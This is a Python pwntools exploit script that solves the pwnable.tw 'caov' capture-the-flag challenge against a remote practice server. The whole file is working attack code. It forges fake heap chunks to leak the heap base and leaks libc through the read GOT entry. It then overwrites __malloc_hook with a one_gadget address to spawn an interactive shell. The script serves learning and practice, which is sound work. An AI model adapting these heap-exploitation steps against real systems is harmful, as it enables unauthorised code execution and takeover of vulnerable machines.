#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./caov_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata)
sa = lambda recvdata, senddata : p.sendafter(recvdata, senddata)
sl = lambda senddata : p.sendline(senddata)
sla = lambda recvdata, senddata : p.sendlineafter(recvdata, senddata)
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata, timeout=timeout)
uu32 = lambda data : u32(data, signed='unsigned')
uu64 = lambda data : u64(data, signed='unsigned')
iu32 = lambda data : u32(data, signed='signed')
iu64 = lambda data : u64(data, signed='signed')
up32 = lambda data : p32(data, signed='unsigned')
up64 = lambda data : p64(data, signed='unsigned')
ip32 = lambda data : p32(data, signed='signed')
ip64 = lambda data : p64(data, signed='signed')

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10306)

def init(name, key, value=0x1):
    sla('Enter your name: ', name)
    sla('Please input a key: ', key)
    sla('Please input a value: ', str(value))

def show():
    sla('Your choice: ', '1')

def edit(name, length, key, value=0x1):
    sla('Your choice: ', '2')
    sla('Enter your name: ', name)
    sla('New key length: ', str(length))
    if length > 0x3E8:
        return
    sla('Key: ', key)
    sla('Value: ', str(value))

def edit_name(name):
    edit(name, 0x400, None)

#https://nopnoping.github.io/pwnable-caov/
# leak heap base
fake_chunk = 0x6032c0 + 0x10
init('b3a1e', '\x00' * 0x30) # length=0
#gdb.attach(p, 'b free\nc')
#edit(cyclic(160), 'B', 0x5678)
edit((up64(0x0) + up64(0x21) + '\x00' * 0x18 + up64(0x21)).ljust(0x60, '\x00') + up64(fake_chunk), 0x10, 'A' * 0x10)
edit_name((up64(0x0) + up64(0x41) + '\x00' * 0x38 + up64(0x21)).ljust(0x60, '\x00') + up64(fake_chunk))
ru('Your data info after editing:')
ru('Key: ')
heap_addr = uu64(ru('\n')[:-1].ljust(8, '\x00'))
heap_base = heap_addr - 0x11c90
info('heap_addr = ' + hex(heap_addr))
info('heap_base = ' + hex(heap_base))

# leak libc
read_got = elf.got['read']
#gdb.attach(p, 'b *0x00000000004014B0\nb malloc\nb free\nc')
edit((up64(0x0) + up64(0x41) + up64(heap_addr + 0x40) + '\x00' * 0x30 + up64(0x21)).ljust(0x60, '\x00') + up64(0x0), 0x30, '\x00')
edit((up64(0x0) + up64(0x41) + up64(heap_addr + 0x40) + '\x00' * 0x30 + up64(0x21)).ljust(0x60, '\x00') + up64(0x0), 0x30, up64(read_got))
ru('Your data info after editing:')
ru('Key: ')
libc_base = uu64(ru('\n')[:-1].ljust(8, '\x00')) - 0xf6670
info('libc_base = ' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gadgets[2]
info('one_gadget = ' + hex(one_gadget))

# get shell
edit_name((up64(0x0) + up64(0x71)).ljust(0x60, '\x00') + up64(fake_chunk) + '\x00' * 0x10 + up64(0x21))
edit((up64(0x0) + up64(0x71) + up64(malloc_hook - 0x23)).ljust(0x60, '\x00') + '\x00' * 0x18 + up64(0x21), 0x60, '\x00')
#gdb.attach(p)
edit('\x00', 0x60, 'A' * 0x13 + p64(one_gadget))

p.interactive()

